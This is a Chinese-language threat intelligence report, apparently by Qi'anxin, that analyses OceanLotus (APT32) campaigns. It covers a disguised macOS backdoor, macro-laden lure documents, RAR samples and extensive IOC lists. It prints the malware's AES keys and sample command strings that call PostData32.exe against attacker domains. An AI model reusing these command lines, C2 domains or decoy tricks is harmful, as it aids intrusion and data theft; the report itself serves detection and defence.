6c2a8612c6511df2876bdb124c33d3e1 |  2018-07-23,04:50:51 |  93184 |
DllHijack.dll  
7dace8f91a35766e9c66dd6258552b02 |  2018-07-23,12:59:23 |  142336 |
DllHijack.dll  
c9093362a83b0e7672a161fd9ef9498a |  2018-08-07,03:12:39 |  92672 |
DllHijack.dll  
38f9655c72474b6c97dc9db9b3609677 |  2018-08-09,10:11:58 |  93184 |
DllHijack.dll  
4bb4d19b42e74bd11459c9358c1a6f01 |  2018-08-13,02:21:13 |  168960 |
DllHijack.dll  
f42611ac0ea2c66d9f27ae14706c1b00 |  2018-08-13,08:46:56 |  92672 |
DllHijack.dll  
c28abdfe45590af0ef5c4e7a96d4b979 |  2018-08-15,03:20:08 |  92672 |
DllHijack.dll  
cf0b74fe79156694a2e3ea81e3bb1f85 |  2018-08-20,02:12:34 |  92672 |
DllHijack.dll  
c78fd680494b505525d706c285d5ebce |  2018-08-20,02:23:12 |  92672 |
DllHijack.dll  
77390c852addc3581d14acf06991982e |  2018-08-29,03:20:46 |  168960 |
DllHijack.dll  
49e969a9312ee2ae639002716276073f |  2018-08-29,03:50:11 |  93184 |
DllHijack.dll  
f5ad93917cd5b119f82b52a0d62f4a93 |  2018-08-30,08:22:15 |  129536 |
DllHijack.dll  
6291eabf6a8c58cad6a04879b7ba229f |  2018-09-04,02:24:06 |  92672 |
DllHijack.dll  
9a10292157ac3748212fb77769873f6c |  2018-09-04,02:42:21 |  129536 |
DllHijack.dll  
a406626173132c8bd6fe52672deacbe7 |  2018-09-06,02:03:30 |  92672 |
DllHijack.dll  
93c3d6cffdcb0a2f29844ff130a920be |  2018-09-06,08:01:41 |  129536 |
DllHijack.dll  
6b8fc8c9fe4f4ef90b2fcbcc0d24cfc9 |  2018-09-10,02:44:30 |  119296 |
DllHijack.dll  
1211dea7b68129d48513662e546c6e21 |  2018-09-11,03:06:50 |  92672 |
DllHijack.dll  
2f1f8142d479a1daf3cbd404c7c22f9f |  2018-09-17,04:12:57 |  111616 |
DllHijack.dll  
0f877ad5464fcbb12e1c019adf7065cc |  2018-09-18,02:24:47 |  92672 |
DllHijack.dll  
cab262b84dbd319f3df84f221e5c451f |  2018-09-18,03:00:51 |  111616 |
DllHijack.dll  
07ff4f943b202f4e16c227679d9b598a |  2018-09-19,02:01:04 |  92672 |
DllHijack.dll  
7a6ba3e26c86f3366f544f4553c9d00a |  2018-09-24,07:12:34 |  93184 |
DllHijack.dll  
518f52aabd9a059d181bfe864097091e |  2018-09-25,02:59:04 |  111616 |
DllHijack.dll  
70a64ae401c0a5f091b5382dea2432df |  2018-10-03,04:17:51 |  111616 |
DllHijack.dll  
d40b4277e0d417e2e0cff47458ddd62d |  2018-10-09,03:22:19 |  95232 |
DllHijack.dll  
5f1bc795aa784f781d91acc97bec6644 |  2018-10-17,08:02:50 |  209412 |
DllHijack.dll  
305d992821740a9cbbda9b3a2b50a67c |  2018-10-22,03:27:24 |  92672 |
DllHijack.dll  
7df61bc3a146fcf56fe1bbd3c26ea8c0 |  2018-10-22,03:34:11 |  113664 |
DllHijack.dll  
3c04352c5230b8cbaa12f262dc01d335 |  2018-11-14,07:07:53 |  92672 |
DllHijack.dll  
41f717eda9bc37de6ea584597f60521f |  2018-11-15,02:03:44 |  92672 |
DllHijack.dll  
db81a7e405822be63634001ec0503620 |  2018-11-28,08:55:24 |  112128 |
DllHijack.dll  
865a7e3cd87b5bc5feec9d61313f2944 |  2018-11-29,02:21:27 |  92672 |
DllHijack.dll  
aad445e7ffc5ce463996e5db13350c5b |  2018-11-29,08:18:42 |  115712 |
DllHijack.dll  
9bcd0b2590c53e4c0ed5614b127c6ba7 |  2018-11-29,09:25:15 |  112128 |
DllHijack.dll  
7338852de96796d7f733123f04dd1ae9 |  2018-12-04,02:27:26 |  92672 |
DllHijack.dll  
906a6898d099eb50c570a4014c1760f5 |  2018-12-04,04:31:45 |  115712 |
DllHijack.dll  
a530410bca453c93b65d0de465c428e4 |  2018-12-06,03:21:22 |  115712 |
DllHijack.dll  
de409b2fe935ca61066908a92e80be29 |  2018-12-10,04:03:20 |  115712 |
DllHijack.dll  
2756b2f6ba5bcf811c8baced5e98b79f |  2018-12-10,04:29:12 |  92672 |
DllHijack.dll  
  
### MAC后门关联

通过在上一章中对MAC样本回连的C2：rio.imbandaad.com
进行域名反查后，我们发现解析IP为198.15.119.125。当再次对该IP进行IP反查后，我们发现其中一个域名web.dalalepredaa.com域名已经打上了海莲花的标签

![海莲花](https://image.3001.net/images/20190509/1557386190_5cd3d3ce2a1c6.png!small)

而通过该域名，我们发现了一个海莲花的最新MAC样本。

首先，该样本为了伪装成文档，将文件夹名字中的docx中的d，改为小写罗马数字五百，从而欺骗用户：Don khieu nai.ⅾocx

Windows系统下看是这样的：

![海莲花](https://image.3001.net/images/20190509/1557386196_5cd3d3d418b35.png!small)

Macosx系统上看是office图标的docx文件，其实是目录：

![海莲花](https://image.3001.net/images/20190509/1557386201_5cd3d3d9c5dc2.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386209_5cd3d3e19911a.png!small)

因为Info.plist中的iconFile指向了一个doc的图标文件，如图：

![海莲花](https://image.3001.net/images/20190509/1557386215_5cd3d3e7b0edf.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386221_5cd3d3ed11e75.png!small)

样本执行起来后，会在Library目录中创建3个目录：  

> LaunchAgents
>
> Media
>
> Video

并安装一个名字为LaunchAgents的应用，实现开机启动：

![image.png](https://image.3001.net/images/20190509/1557386297_5cd3d439d7a27.png!small)

该应用的程序指向Video目录下的mediaagentd程序：

![海莲花](https://image.3001.net/images/20190509/1557386306_5cd3d442aa946.png!small)同时之前的目录被替换成真的docx文件，实现偷梁换柱：

![海莲花](https://image.3001.net/images/20190509/1557386311_5cd3d44719294.png!small)

而释放的mediaagentd程序是加壳的，会解密后在内存中加载并执行：

![海莲花](https://image.3001.net/images/20190509/1557386317_5cd3d44d8537e.png!small)

脱壳后的MACOS文件如下：

![海莲花](https://image.3001.net/images/20190509/1557386323_5cd3d45397d14.png!small)

该文件的入口处，会有一个while死循环，执行收集电脑信息并发送后，进入远控的循环函数，会随机睡眠一段时间，并继续走重复的流程：

![海莲花](https://image.3001.net/images/20190509/1557386329_5cd3d4590fc79.png!small)

内部的很多字符串都被加密了，下图为使用该加密函数的地方：

![海莲花](https://image.3001.net/images/20190509/1557386334_5cd3d45ee6b42.png!small)

解密方法主要是通过CCCrypt解密，算法为aes，iv为0，如图：

![海莲花](https://image.3001.net/images/20190509/1557386340_5cd3d4648a88d.png!small)

AES密钥（HEX）为：4E620ABEDAFB4D9866CC9D9C2D29E2D7EA18ADF1不够32位补零：

![海莲花](https://image.3001.net/images/20190509/1557386345_5cd3d46986687.png!small)

解密的所有字符串如下：

![海莲花](https://image.3001.net/images/20190509/1557386352_5cd3d47091a76.png!small)

而且会把收集的信息经过AES加密后通过CURL库发送出去：

![海莲花](https://image.3001.net/images/20190509/1557386357_5cd3d47595fbf.png!small)

远控的消息分发函数如下：会根据第一自己的token执行不同的操作，下图为列目录的操作：

![海莲花](https://image.3001.net/images/20190509/1557386366_5cd3d47e34b2d.png!small)

传输数据用的密钥和解密字符串的密钥不一样，下图为传输数据的加密密钥：

07E74FF2CE9688C8F79B91AB32C95D11C140D3AC

![海莲花](https://image.3001.net/images/20190509/1557386371_5cd3d4837bae5.png!small)

加密后的数据发送到C2，如图：

C2: web.dalalepredaa.com

![海莲花](https://image.3001.net/images/20190509/1557386376_5cd3d4884e0e9.png!small)

值得注意的是，我们发现海莲花近期的Mac样本中有的会带有签名，去重后我们发现常用的为两个：

MelindaCline ( **P74QRJXB2F** )

DAVIDDOWELL ( **B5YH6VDVRE** )

### Office样本关联

经过关联分析发现，该宏文档样本与大量样本存在同源情况。

下图为其中比对案例，可以看出，文档的创建内容的时间相同，并且作者同样相同。

![海莲花](https://image.3001.net/images/20190509/1557386384_5cd3d4902a683.png!small)

下图为模板特征，模板文件名极具海莲花特色。

![海莲花](https://image.3001.net/images/20190509/1557386389_5cd3d495b4cfa.png!small)

经过分析发现，我们总结了海莲花的攻击文档中常用的作者名，其中最大规模的攻击活动为“DEV”活动和” Tushar”活动。

![海莲花](https://image.3001.net/images/20190509/1557386396_5cd3d49c1d3f5.png!small)

通过对各类维度进行关联分析后，可以得到在这一系列恶意宏文档投放活动中涉及的文档名和Hash值。

文档名 |  MD5  
---|---  
test.doc |  5c9ef8b5263651a08ea1b79057a5ee28  
Scan_Mau_Ao_Thun.doc |  b858c08cf7807e462ca335233bd83fe7  
Content marketing Kaspersky.doc |  c313f8a5fd8ca391fc85193bc879ab02  
doc.doc |  473fdfefa92725099ca87e992edbc92c  
LÝ_ANH_TRUNG_CV.doc |  02cec2f17a7910b6fa994f340bbbc297  
LÝ ANH TRUNG CV.doc |  dd5ae0c0a7e17d101f570812fec4e5e4  
LÝ_ANH_TRUNG_CV.doc |  90e5ff68bf06cb930ed8c040139c4650  
LÝ_ANH_TRUNG_CV.doc |  6db450c4c756071ecafff425d6183d7d  
CV-DucNguyenMinh.doc |  cb39e2138af92c32e53c97c0aa590d48  
CV Nguyen Minh Duc.docx |  8e13895504e643cd8e0e87377b25bd6b  
Danh sach can bo vi pham.doc |  d3c27f779d615a1d3a35dff5e9561eb0  
Danh Sach Nhan Vien Bien Thu Tien Cong Ty.docx |
27425360d18feea54860420006ea9833  
Danh Sach Nhan Vien Bien Thu Tien Cong Ty.docx |
cf0142da12509f544a59093495c3a6dd  
CV-AnthonyWei-CustomerService.docx |  b1df440e5dd64ffae9f7e792993f2f4c  
|  878fa022bd5e5caf678fe8d728ce42ee  
|  f78be074f6bc67a712e751254df5f166  
Ho Chi Minh.docx |  e2aed850c18449a43886fc79b342132f  
DS-Card-ChienThang-TraVinh.docx |  74b456adf2ae708789fb2d34ecccb954  
HopDong-XXX-TP-092018.docx |  72263750df84e24fe645206a51772c88  
BBLV_ASC_DG_092018.docx |  3a574c28beca4f3c94d30e3cf3979f4c  
indo.docx |  ee836e0f7a40571523bf56dba59898f6  
Danh sách các nhà đấu tranh bị bắt 2.9.doc |  f6068b672a19ce14981df011a55081e4  
1 |  00ac0d7337290b74bdd7f43ec4a67ddb  
  
针对这批样本的诱饵名称进行分析后，各有特色

1、名称具有政治特色：被捕活动人士名单

![海莲花](https://image.3001.net/images/20190509/1557386404_5cd3d4a4b2755.png!small)

2、包括一些利用简历去进行钓鱼攻击活动

![海莲花](https://image.3001.net/images/20190509/1557386409_5cd3d4a957dca.png!small)

可以关联到@vupt_bka安全研究员分析的一封海莲花使用简历钓鱼的邮件。

<https://twitter.com/vupt_bka/status/1083653486963638275>

![海莲花](https://image.3001.net/images/20190509/1557386415_5cd3d4aff3799.png!small)

3、还有一些显示诱导宏启动的文档，与以往的诱导界面不一致。

![海莲花](https://image.3001.net/images/20190509/1557386421_5cd3d4b58d1d8.png!small)

并且历史样本和最新样本技术方面同样存在不同，如下所示，某些历史样本并没有使用模板注入技术，而是使用的直接宏代码执行方法，并将要执行的代码显示在文档内容中，也就是样本分析一节中提到的OHN宏代码。

![海莲花](https://image.3001.net/images/20190509/1557386429_5cd3d4bd5e099.png!small)

 **上述这类宏样本在经过关联分析后，可以发现该类攻击最早是在2017** **年，越南上传的诱饵文档，从文件名看，很大概率是测试样本。**

> SAMPLES 08_11__12_2017 (317)
>
> c4d35f3263fef4a533e7403682a034c3

4、出现频率最高的越南语文档保护诱饵系列

![海莲花](https://image.3001.net/images/20190509/1557386436_5cd3d4c415c7d.png!small)

### 压缩包类诱饵关联

在对海莲花的一个Thu moi2019.rar样本进行分析的过程中，我们发现该样本的生成时间疑似存在自定义的嫌疑

![海莲花](https://image.3001.net/images/20190509/1557386441_5cd3d4c9c891c.png!small)

因为从样本的上传时间来看，其上传至VT的时间为2019年3月1日，而压缩包内的时间差距过大。

![海莲花](https://image.3001.net/images/20190509/1557386446_5cd3d4ce8a33a.png!small)

因此，我们对该时间进行关联捕获后，发现了多个海莲花的关联样本。

文件名 |  MD5  
---|---  
60982849-c8e4-4039-8f59-dfb78d8bab0d 15f5adf1-8798-49bf-b666-4a6c3d90b69e |
bcbc1bef20d2befdd290e31269e0174a  
4052d2e7-ca42-4cd4-8841-52f782bba411  |  dfaa343552e8d470096a0a09a018930f  
ffea6446-ab7a-4e47-b7ff-e461f9775177  |  9b1ce9df321ce88ade4ff3b0ada5d414  
5d47e097-c3bc-401e-8c0f-e877280b368a  |  da14eece6191551a31d37d1e96681cd1  
Thu moi 2019.rar  |  76289f02a0b31143d87d5e35839fb24a  
  
因此可以进一步肯定，海莲花团伙会自定义样本的生成时间，并批量生成样本进行投放。

## 总结

本报告涉及了大量的对于海莲花团伙对中南半岛国家攻击活动及所使用的资源，揭示了其从不停歇的攻击历史、极其广泛的攻击目标和非常有创意的技术手段。海莲花组织无论是针对国内外进行攻击，其投放诱饵的手段、载荷变化、木马免杀技术，甚至是回连域名资产均在不停地演进变化，体现了非常强大的对抗能力和攻击意志。

因此，我们在跟踪海莲花针对中国的攻击活动时，通过分析海莲花针对其他实体攻击行动中所体现的TTP，对其加深了解并持续进行针对性的对抗，这个过程永无止境。

## IOC

域名

> syn.servebbs.com
>
> word.webhop.info
>
> beta.officopedia.com
>
> outlook.updateoffices.net
>
> outlook.betamedias.com
>
> outlook.officebetas.com
>
> office.allsafebrowsing.com
>
> open.betaoffice.net
>
> cortanazone.com
>
> b.cortanazone.com
>
> cortanasyn.com
>
> api.blogdns.com
>
> dominikmagoffin.com
>
> blog.artinhauvin.com
>
> worker.baraeme.com
>
> kingsoftcdn.com
>
> style.fontstaticloader.com
>
> plan.evillese.com
>
> bluesky2018man.com
>
> enum.arkoorr.com
>
> background.ristians.com
>
> pong.dynathome.net
>
> zone.servehttp.com
>
> cdn.eworldship-news.com
>
> api.blogdns.com
>
> online.stienollmache.xyz
>
> image.fontstaticloader.com
>
> mappingpotentials.com
>
> vnbizcom.com
>
> cdn3.onlinesurveygorilla.com
>
> eworldship-news.com
>
> enormousamuses.com
>
> 163mailservice.com
>
> stackbio.com
>
> mailserviceactivation.com
>
> web.dalalepredaa.com
>
> rio.imbandaad.com
>
> p12.alerentice.com

诱饵文档

> fd128b9f0cbdc374227cf5564371aacc
>
> 4a0144c7436e3ff67cf2d935d82d1743
>
> 4c30e792218d5526f6499d235448bdd9
>
> d8a5a375da7798be781cf3ea689ae7ab
>
> 2d3fb8d5b4cefc9660d98e0ad46ff91a
>
> 89e3f31c6261f4725b891c8fd29049c9
>
> 7b0e819bd8304773c3648ab03c9f182a
>
> c4d35f3263fef4a533e7403682a034c3
>
> b1df440e5dd64ffae9f7e792993f2f4c
>
> a76be0181705809898d5d7d9aed86ee8
>
> 2785311085b6ca782b476d9c2530259c
>
> 60501717f81eacd54facecf3ebadc306
>
> 3d7cd531d17799832e262eb7995abde6
>
> c7931fa4c144c1c4dc19ad4c41c1e17f

同源文档:

> 5c9ef8b5263651a08ea1b79057a5ee28
>
> b858c08cf7807e462ca335233bd83fe7
>
> c313f8a5fd8ca391fc85193bc879ab02
>
> 473fdfefa92725099ca87e992edbc92c
>
> 02cec2f17a7910b6fa994f340bbbc297
>
> dd5ae0c0a7e17d101f570812fec4e5e4
>
> 90e5ff68bf06cb930ed8c040139c4650
>
> 6db450c4c756071ecafff425d6183d7d
>
> cb39e2138af92c32e53c97c0aa590d48
>
> 8e13895504e643cd8e0e87377b25bd6b
>
> d3c27f779d615a1d3a35dff5e9561eb0
>
> 27425360d18feea54860420006ea9833
>
> cf0142da12509f544a59093495c3a6dd
>
> b1df440e5dd64ffae9f7e792993f2f4c
>
> 878fa022bd5e5caf678fe8d728ce42ee
>
> f78be074f6bc67a712e751254df5f166
>
> e2aed850c18449a43886fc79b342132f
>
> 74b456adf2ae708789fb2d34ecccb954
>
> 72263750df84e24fe645206a51772c88
>
> 3a574c28beca4f3c94d30e3cf3979f4c
>
> ee836e0f7a40571523bf56dba59898f6
>
> f6068b672a19ce14981df011a55081e4
>
> 00ac0d7337290b74bdd7f43ec4a67ddb

同源PE

> 2f9af6b9d73218c578653d6d9bd02d4d
>
> c9d29501410e19938cd8e01630dc677b

URL:

[http[:]//download-attachments.s3.amazonaws.com/db08b565038ac83e89e7b55201479f37ea49e525/f0c6ea8e-d2f8-445f-b649-57808b2015b7](http://download-attachments.s3.amazonaws.com/db08b565038ac83e89e7b55201479f37ea49e525/f0c6ea8e-d2f8-445f-b649-57808b2015b7)

样本特征:

> ZA:\Code\Macro_NB2\Request\PostData32.exe-u
> <https://word.webhop.info/blak32.gif> -t 200000
>
> ZA:\Code\Macro_NB2\Request\PostData32.exe-u
> <https://syn.servebbs.com/kuss32.gif> -t 200000
>
> UA:\Code\Nb2VBS\Request\PostData32.exe-u
> <https://ristineho.com/threex32.png> -t 60000
>
> XA:\Code\Macro_NB2\Request\PostData32.exe-u
> <https://cortanasyn.com/kirr32.png> -t 200000
>
> C:\Users\WIN7UTL64\Desktop\Macro_NB2_new\Request\PostData32.exe
>
> {C:\Users\WIN7UTL64\Desktop\Macro_NB2_new\Request\PostData32.exe-u
> <https://office.allsafebrowsing.com/fdsw32.png> -t 240000
>
> SecurityAndMaintenance_Error.bin
>
> d:\work\malware\vinacap\SecurityAndMaintenance_Error.png
>
> d:\work\forensics\vinacap\dfir\nhule\files\SecurityAndMaintenance_Error.png
>
> D:\work\forensics\vinacap\DFIR\Nhule\files\SecurityAndMaintenance_Error.png

MAC样本签名：

MelindaCline ( **P74QRJXB2F** )

DAVIDDOWELL ( **B5YH6VDVRE** )

## 参考链接

[1] <https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/>

[2] <https://twitter.com/blackorbird/status/1118399331688570880>

[3]
<https://medium.com/@sp1d3rm4n/apt32-oceanlotus-m%E1%BB%99t-chi%E1%BA%BFn-d%E1%BB%8Bch-apt-b%C3%A0i-b%E1%BA%A3n-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-ph%E1%BA%A7n-2-119a24585d9a>

[4] <https://twitter.com/blackorbird/status/1086186184768815104>

[5] <https://twitter.com/RedDrip7/status/1119204830633848834>

***本文作者：奇安信威胁情报中心，转载请注明来自FreeBuf.COM**

